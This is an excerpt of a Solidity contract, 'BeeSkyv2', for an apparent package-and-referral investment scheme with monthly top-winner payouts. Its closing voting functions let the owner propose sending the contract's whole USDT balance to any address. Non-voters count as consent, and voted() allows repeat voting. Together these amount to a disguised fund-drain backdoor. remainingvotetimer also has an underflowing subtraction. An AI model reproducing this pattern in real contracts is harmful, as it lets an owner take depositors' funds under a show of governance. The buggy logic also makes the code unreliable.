...
contract BeeSkyv2 is Ownable {
  ...
  address public USDT = 0xDb14Dd16268A08a1B18C93A118a94707957d3C58;
  address public GLOVERNANCE = 0x2945b994210d5E9dC56761e16e7F54d47ccaaf9B;

  uint256 INITIAL_PRICE = 7000000000000; //1000 000 000
  uint256 CHANGERATE_PRICE = 10000; //4
  ...
  constructor() Ownable(msg.sender) {
    ...
    fee.refer[5] = 5;
    fee.withdraw = 0;
    Package memory newpack1 = Package( 50, 25, 0,"Bronze");
    Package memory newpack2 = Package( 500, 300, 0,"Silver");
    Package memory newpack3 = Package( 1000, 700, 0,"Gold");
    Package memory newpack4 = Package( 5000, 4000, 0,"Platinum");
    Package memory newpack5 = Package( 10000, 9000, 0,"Exclusive");
    Package memory newpack6 = Package( 30000, 30000, 0,"Crown");
  ...
  function getTopWinner(uint256 _month) public view returns (address[] memory) {
    ...
    address[] memory exclude_adr = new address[](5);
    top_adr[0] = findTopWinner(adrs,exclude_adr,_month);
    if(top_adr[0]!=owner){ exclude_adr[0] = top_adr[0]; }
    top_adr[1] = findTopWinner(adrs,exclude_adr,_month);
    if(top_adr[1]!=owner){ exclude_adr[1] = top_adr[1]; }
    top_adr[2] = findTopWinner(adrs,exclude_adr,_month);
    if(top_adr[2]!=owner){ exclude_adr[2] = top_adr[2]; }
    top_adr[3] = findTopWinner(adrs,exclude_adr,_month);
    if(top_adr[3]!=owner){ exclude_adr[3] = top_adr[3]; }
    top_adr[4] = findTopWinner(adrs,exclude_adr,_month);
    if(top_adr[4]!=owner){ exclude_adr[4] = top_adr[4]; }
    return top_adr;
  }
  ...
  function setUpFee(uint256[] memory _fees) public onlyOwner {
    ...
    require(_fees[9]<=50,"fee withdraw must be less than or equre to 5%");
  ...
  function claimTopShared(uint256 _month) external returns (bool) {
    ...
    if(top_adr[0]==msg.sender){ spenderamount = takefee(spenderamount,50,100); }
    else if(top_adr[1]==msg.sender){ spenderamount = takefee(spenderamount,20,100); }
    else if(top_adr[2]==msg.sender){ spenderamount = takefee(spenderamount,15,100); }
    else if(top_adr[3]==msg.sender){ spenderamount = takefee(spenderamount,10,100); }
    else if(top_adr[4]==msg.sender){ spenderamount = takefee(spenderamount,5,100); }
  ...
  function createVote(address _account) external onlyOwner {
    require(!votenow,"revert by current voting");
    votenow = true;
    votestart = block.timestamp;
    takeoff_address = _account;
    vote_yes = 0;
    vote_no = 0;
  }

  function remainingvotetimer() public view returns (uint256) {
    if(votestart.add(60*60*24*30)>block.timestamp){
      return votestart.sub(block.timestamp);
    }else{
      return 0;
    }
  }

  function voted(bool _flag) public returns (bool) {
    require(votenow,"not in voting or vote ended");
    vote[msg.sender].no = !_flag;
    vote[msg.sender].stamp = block.timestamp;
    if(_flag){
      vote_yes = vote_yes.add(1);
    }else{
      vote_no = vote_no.add(1);
    }
    return true;
  }

  function closevote() public onlyOwner returns (bool) {
    require(votenow,"not in voting or vote ended");
    require(block.timestamp>votestart.add(60*60*24*30),"waitting until end voted");
    uint256 i = 0;
    uint256 max = participants;
    uint256 enum_no = 0;
    do{
      if(vote[linkaddress[i]].no){
        enum_no = enum_no.add(1);
      }
      i++;
    }while(i<max);
    if(enum_no<participants.div(2)){
      IERC20 usd = IERC20(USDT);
      usd.transfer(takeoff_address,usd.balanceOf(address(this)));
    }
    votenow = false;
    return true;
  }
